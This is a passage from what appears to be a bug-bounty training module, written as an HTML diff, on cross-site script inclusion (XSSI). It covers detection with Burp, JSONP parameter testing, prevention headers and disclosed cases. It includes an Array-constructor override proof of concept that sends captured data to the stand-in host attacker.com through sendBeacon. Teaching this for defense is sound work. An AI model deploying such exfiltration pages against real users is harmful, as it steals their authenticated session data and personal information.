+    {<span class="str">"id"</span>: <span class="val">1</span>, <span class="str">"ssn"</span>: <span class="str">"123-45-6789"</span>},
+    {<span class="str">"id"</span>: <span class="val">2</span>, <span class="str">"ssn"</span>: <span class="str">"987-65-4321"</span>},
+    {<span class="str">"id"</span>: <span class="val">3</span>, <span class="str">"ssn"</span>: <span class="str">"456-78-9012"</span>}
+]</div>
+                </div>
+
+                <div class="vuln-card">
+                    <div class="vuln-card-title">
+                        <img src="/assets/images/icons/icon-warning.webp" alt="" style="width:0.9em;height:0.9em;vertical-align:middle;display:inline-block;object-fit:contain">
+                        Dynamic JS Files
+                    </div>
+                    <div class="vuln-card-desc">
+                        Server-rendered JavaScript files that embed authenticated state &mdash; common in
+                        legacy applications that embed session data into bundled JS at request time.
+                    </div>
+                    <div class="code-label">// server-rendered .js file, generated per request</div>
+                    <div class="code-block"><span class="comment">// Generated by app server for authenticated user</span>
+<span class="kw">window</span>.APP_CONTEXT = {
+    user: { id: <span class="val">4721</span>, name: <span class="str">"Agent_X"</span> },
+    session_expires: <span class="str">"2026-04-12T18:00:00Z"</span>,
+    permissions: [<span class="str">"admin"</span>, <span class="str">"export"</span>, <span class="str">"delete"</span>]
+};</div>
+                </div>
+            </div>
+
+            <h3>The Array Constructor Override (Legacy Attack)</h3>
+            <p>
+                For endpoints returning bare array literals, browsers in ES5 era allowed overriding the
+                global <code>Array</code> constructor before script execution. When the response
+                <code>[{...}, {...}]</code> was parsed, the overridden constructor was called with the data.
+                Modern browsers restrict this, but it remains relevant in older environments and as a
+                concept in reports.
+            </p>
+
+            <div class="code-label">// Attacker's page — ES5 Array constructor override</div>
+            <div class="code-block"><span class="tag">&lt;script&gt;</span>
+<span class="comment">// Override Array constructor BEFORE loading the victim's script.
+// When the bare array literal is evaluated, this constructor runs.</span>
+
+<span class="kw">function</span> Array() {
+    <span class="kw">this</span>[0] = arguments[0];  <span class="comment">// capture first element</span>
+    exfiltrate(<span class="kw">this</span>);
+}
+
+<span class="kw">function</span> exfiltrate(data) {
+    navigator.sendBeacon(<span class="str">'https://attacker.com/log'</span>,
+        JSON.stringify(data));
+}
+<span class="tag">&lt;/script&gt;</span>
+
+<span class="comment">&lt;!-- Loaded AFTER override — browser calls our Array() during parsing --&gt;</span>
+<span class="tag">&lt;script</span> <span class="attr">src</span>=<span class="str">"https://corp.net/api/records.js"</span><span class="tag">&gt;&lt;/script&gt;</span></div>
+        </div>
+    </div>
+
+    <!-- Section 5: Detection Techniques -->
+    <div class="section" id="s5">
+        <div class="section-number">Section 05</div>
+        <h2 class="section-title">
+            <span class="section-icon"><img src="/assets/images/icons/icon-magnifier.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"></span>
+            Detection Techniques
+        </h2>
+        <div class="section-body">
+            <p>
+                Finding XSSI during a bug bounty engagement requires systematically identifying endpoints
+                that return JavaScript and checking whether they carry authenticated data. The workflow
+                below maps directly to a Burp Suite session.
+            </p>
+
+            <h3>Step 1 &mdash; Identify Candidate Endpoints</h3>
+            <p>In Burp Proxy, filter by response Content-Type:</p>
+
+            <div class="code-label">// Burp filter — HTTP history view</div>
+            <div class="code-block">Filter: Content-Type CONTAINS <span class="str">"application/javascript"</span>
+       OR Content-Type CONTAINS <span class="str">"text/javascript"</span>
+
+Look for:
+  - Endpoints under /api/, /data/, /user/, /account/
+  - .js files that vary per request (check Cache-Control: no-store)
+  - Responses containing JSON-like structures (braces, brackets, colons)
+  - Callbacks: grep response body for <span class="str">"callback"</span>, <span class="str">"jsonp"</span>, <span class="str">"cb="</span></div>
+
+            <h3>Step 2 &mdash; Verify Authentication Dependency</h3>
+            <p>
+                Replay the request without cookies. If the response body changes significantly &mdash;
+                returns empty data, an error, or different values &mdash; the endpoint is authentication-sensitive.
+            </p>
+
+            <div class="code-label">// Burp Repeater — cookie strip test</div>
+            <div class="code-block">GET /api/user-data.js HTTP/1.1
+Host: corp.net
+<span class="comment"># With cookies: returns full userData object with PII</span>
+
+GET /api/user-data.js HTTP/1.1
+Host: corp.net
+<span class="hdr">Cookie:</span> (empty / removed)
+<span class="comment"># Without cookies: returns {} or 401 &mdash; endpoint is auth-gated</span></div>
+
+            <h3>Step 3 &mdash; Test for JSONP Parameters</h3>
+
+            <div class="code-label">// Common JSONP parameter names to test</div>
+            <div class="code-block">?callback=test
+?cb=test
+?jsonp=test
+?handler=test
+?func=test
+?fn=test
+?callbackFn=test
+
+<span class="comment"># If response wraps in your function name:
+# test({"uid":4721,...})   &lt;-- vulnerable
+# {"uid":4721,...}          &lt;-- JSONP not enabled</span></div>
+
+            <h3>Step 4 &mdash; Confirm Exploitability</h3>
+            <p>
+                Build a minimal proof-of-concept page. Open it in a browser where you are logged into
+                the target. Check the browser console or a local listener for the exfiltrated data.
+                Only do this in an authorized testing environment.
+            </p>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon"><img src="/assets/images/icons/icon-binoculars.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"></span>
+                <div>
+                    <div class="callout-title">Hunting Tip: Check Legacy Endpoints</div>
+                    <div class="callout-text">
+                        JSONP was a common pre-CORS workaround from 2008 to 2015. Older applications
+                        often still expose JSONP endpoints that have been forgotten. Search the JS
+                        codebase for <code>$.getJSON</code> with a callback parameter, or <code>callback=</code>
+                        in any network request. These are almost always XSSI candidates.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 6: Prevention -->
+    <div class="section" id="s6">
+        <div class="section-number">Section 06</div>
+        <h2 class="section-title">
+            <span class="section-icon"><img src="/assets/images/icons/icon-shield.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"></span>
+            Prevention
+        </h2>
+        <div class="section-body">
+            <p>
+                Eliminating XSSI requires preventing the browser from treating authenticated data
+                responses as executable JavaScript. Several complementary defenses apply.
+            </p>
+
+            <ul class="prevention-list">
+                <li class="prevention-item">
+                    <div class="prevention-icon">
+                        <img src="/assets/images/icons/icon-checkmark.webp" alt="" style="width:0.9em;height:0.9em;vertical-align:middle;display:inline-block;object-fit:contain">
+                    </div>
+                    <div>
+                        <div class="prevention-label">Use application/json, Not application/javascript</div>
+                        <div class="prevention-desc">
+                            The single most effective fix. Respond with <code>Content-Type: application/json</code>
+                            for all data endpoints. Browsers refuse to execute a script tag response with
+                            a JSON content type. XSSI requires the browser to execute the response.
+                        </div>
+                    </div>
+                </li>
+                <li class="prevention-item">
+                    <div class="prevention-icon">
+                        <img src="/assets/images/icons/icon-checkmark.webp" alt="" style="width:0.9em;height:0.9em;vertical-align:middle;display:inline-block;object-fit:contain">
+                    </div>
+                    <div>
+                        <div class="prevention-label">JSON Response Prefix: )]}',</div>
+                        <div class="prevention-desc">
+                            Prefix all JSON responses with a string that makes the response invalid JavaScript
+                            but is stripped by your client-side fetch layer. Google has used this extensively.
+                            A bare <code>)]}'</code> before the JSON causes a SyntaxError if executed as a script.
+                        </div>
+                    </div>
+                </li>
+                <li class="prevention-item">
+                    <div class="prevention-icon">
+                        <img src="/assets/images/icons/icon-checkmark.webp" alt="" style="width:0.9em;height:0.9em;vertical-align:middle;display:inline-block;object-fit:contain">
+                    </div>
+                    <div>
+                        <div class="prevention-label">X-Content-Type-Options: nosniff</div>
+                        <div class="prevention-desc">
+                            Prevents browsers from MIME-sniffing the response. Without this header, a browser
+                            may execute a response with <code>Content-Type: text/plain</code> if the content
+                            looks like JavaScript. <code>nosniff</code> enforces the declared content type.
+                        </div>
+                    </div>
+                </li>
+                <li class="prevention-item">
+                    <div class="prevention-icon">
+                        <img src="/assets/images/icons/icon-checkmark.webp" alt="" style="width:0.9em;height:0.9em;vertical-align:middle;display:inline-block;object-fit:contain">
+                    </div>
+                    <div>
+                        <div class="prevention-label">Eliminate JSONP Entirely</div>
+                        <div class="prevention-desc">
+                            JSONP is obsolete. Replace all JSONP endpoints with proper CORS-enabled
+                            <code>fetch()</code> requests. CORS allows cross-origin requests where explicitly
+                            permitted, without sacrificing the SOP protection that JSONP bypasses entirely.
+                        </div>
+                    </div>
+                </li>
+                <li class="prevention-item">
+                    <div class="prevention-icon">
+                        <img src="/assets/images/icons/icon-checkmark.webp" alt="" style="width:0.9em;height:0.9em;vertical-align:middle;display:inline-block;object-fit:contain">
+                    </div>
+                    <div>
+                        <div class="prevention-label">SameSite Cookie Attribute</div>
+                        <div class="prevention-desc">
+                            <code>SameSite=Strict</code> or <code>SameSite=Lax</code> prevents session cookies
+                            from being sent with cross-site script tag requests in modern browsers.
+                            <code>Strict</code> provides complete protection; <code>Lax</code> allows
+                            top-level navigation but blocks subresource requests.
+                        </div>
+                    </div>
+                </li>
+                <li class="prevention-item">
+                    <div class="prevention-icon">
+                        <img src="/assets/images/icons/icon-checkmark.webp" alt="" style="width:0.9em;height:0.9em;vertical-align:middle;display:inline-block;object-fit:contain">
+                    </div>
+                    <div>
+                        <div class="prevention-label">Anti-CSRF Tokens on Data Endpoints</div>
+                        <div class="prevention-desc">
+                            Require a custom request header (e.g., <code>X-Requested-With: XMLHttpRequest</code>)
+                            or a CSRF token on all data API endpoints. Script tags cannot set custom headers,
+                            so an endpoint requiring them cannot be exploited via XSSI.
+                        </div>
+                    </div>
+                </li>
+            </ul>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>Vulnerable Response</h3>
+                    <div class="code-block" style="font-size:0.78rem"><span class="hdr">HTTP/1.1 200 OK</span>
+Content-Type: <span class="val">application/javascript</span>
+Cache-Control: no-store
+
+<span class="kw">var</span> userData = {
+    email: <span class="str">"victim@corp.net"</span>,
+    token: <span class="str">"sk-abc123"</span>
+};</div>
+                </div>
+                <div class="col-card">
+                    <h3>Hardened Response</h3>
+                    <div class="code-block" style="font-size:0.78rem"><span class="hdr">HTTP/1.1 200 OK</span>
+Content-Type: <span class="val">application/json</span>
+X-Content-Type-Options: nosniff
+Cache-Control: no-store
+
+)]}'
+{<span class="str">"email"</span>:<span class="str">"victim@corp.net"</span>,
+ <span class="str">"token"</span>:<span class="str">"sk-abc123"</span>}</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 7: Real-World Examples -->
+    <div class="section" id="s7">
+        <div class="section-number">Section 07</div>
+        <h2 class="section-title">
+            <span class="section-icon"><img src="/assets/images/icons/icon-star.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"></span>
+            Real-World Examples
+        </h2>
+        <div class="section-body">
+            <p>
+                XSSI has appeared in bug bounty reports against several major platforms. The following
+                cases are drawn from publicly disclosed reports and security research. All were reported
+                responsibly and patched before disclosure.
+            </p>
+
+            <div class="example-card">
+                <div class="example-company">Google (Bug Bounty -- Multiple Programs)</div>
+                <div class="example-title">JSONP Endpoints Across Google Services</div>
+                <div class="example-body">
+                    Google's security team has historically documented XSSI as a known issue class.
+                    The <code>)]}'</code> prefix pattern was developed specifically as a response to XSSI
+                    findings across Google products. Google's Bughunter University explicitly lists
+                    "Cross-Site Script Inclusion" as an eligible vulnerability class. Researchers found
+                    authenticated JSONP endpoints on Calendar, Drive, and Contacts that exposed contact
+                    lists and calendar event data. Google subsequently rolled out the prefix pattern
+                    and <code>SameSite</code> cookies platform-wide.
+                </div>
+            </div>
+
+            <div class="example-card">
+                <div class="example-company">Facebook (Bug Bounty -- Multiple Reporters)</div>
+                <div class="example-title">Dynamic JavaScript Configuration Leakage</div>
+                <div class="example-body">
+                    Facebook's legacy application architecture served per-request JavaScript configuration
+                    files that included user-specific data such as friend lists, group memberships, and
+                    application permission scopes. Several researchers independently discovered that these
+                    endpoints were accessible via script tag inclusion. Facebook addressed these findings
+                    by migrating configuration delivery to <code>application/json</code> endpoints
+                    protected by custom request headers, and by enforcing the <code>SameSite=Strict</code>
+                    cookie attribute on authentication cookies.
+                </div>
+            </div>
+
+            <div class="example-card">
+                <div class="example-company">General Pattern -- Legacy Enterprise Applications</div>
+                <div class="example-title">JSONP Callback Parameters in Forgotten API Endpoints</div>
+                <div class="example-body">
+                    A recurring pattern in enterprise web applications built between 2008 and 2014:
+                    an API endpoint added a <code>?callback=</code> parameter for a now-deleted frontend
+                    feature. The parameter is no longer used by the application but was never removed
+                    from the server. A researcher submitting a <code>?callback=myFunction</code> parameter
+                    receives a JSONP-wrapped response with the victim's authenticated session data.
+                    These are consistently rated High severity on HackerOne and Bugcrowd when PII or
+                    tokens are exposed.
+                </div>
+            </div>
+
+            <div class="callout callout-danger">
+                <span class="callout-icon"><img src="/assets/images/icons/icon-skull.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"></span>
+                <div>
+                    <div class="callout-title">Scope and Authorization Reminder</div>
+                    <div class="callout-text">
+                        Building and deploying an actual XSSI exploit page &mdash; even to test a finding
+                        &mdash; must only occur within the scope of an authorized bug bounty program or
+                        explicit written authorization. Do not host exploit pages that target real
+                        production users. In a bug report, the proof-of-concept code is sufficient
+                        evidence without execution against real sessions.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Completion -->
+    <div class="section" id="completion">
+        <div class="completion-section">
+            <div class="completion-icon">&#10003;</div>
+            <h2 class="completion-title">Module Complete</h2>
+            <p class="completion-text">
+                You have covered the XSSI attack model and why the script tag Same-Origin Policy exception
+                creates the vulnerability, step-by-step attack execution for variable assignment, JSONP,
+                and array literal patterns, the distinction between XSSI, XSS, and CSRF across the
+                browser trust model, detection methodology including Content-Type filtering, cookie
+                stripping tests, and JSONP parameter fuzzing, all major prevention controls including
+                the JSON prefix pattern, Content-Type enforcement, and SameSite cookies, and real-world
+                disclosure context from Google and Facebook bug bounty programs.
+            </p>
+            <button class="completion-btn" onclick="completeModule()">
+                <span>&#10003;</span>
+                Complete Module
+            </button>
+        </div>
+    </div>
+
+</main>
+
+<script>
+    // Scroll progress bar updates both the fixed top stripe and the mini header bar
+    function updateScrollProgress() {
+        var scrollTop = window.scrollY;
+        var docHeight = document.documentElement.scrollHeight - window.innerHeight;
+        var pct = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+        document.getElementById('scrollProgress').style.width = pct + '%';
+        document.getElementById('readingFill').style.width = pct + '%';
+    }
+
+    window.addEventListener('scroll', updateScrollProgress, { passive: true });
+
+    // Section fade-in via IntersectionObserver — adds 'visible' class on viewport entry
+    function initSectionAnimations() {
+        var observer = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('visible');
+                }
+            });
+        }, { threshold: 0.08 });
+
+        document.querySelectorAll('.section').forEach(function(s) {
+            observer.observe(s);
+        });
+    }
+
+    // Module completion — delegates to ModuleProgress if loaded, falls back to navigation
+    function completeModule() {
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.complete('dark-arts', 'bh-mod-xssi', {
+                returnUrl: '../index.html'
+            });
+        } else {
+            window.location.href = '../index.html';
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+        initSectionAnimations();
+    });
+</script>
+
+</body>
+</html>
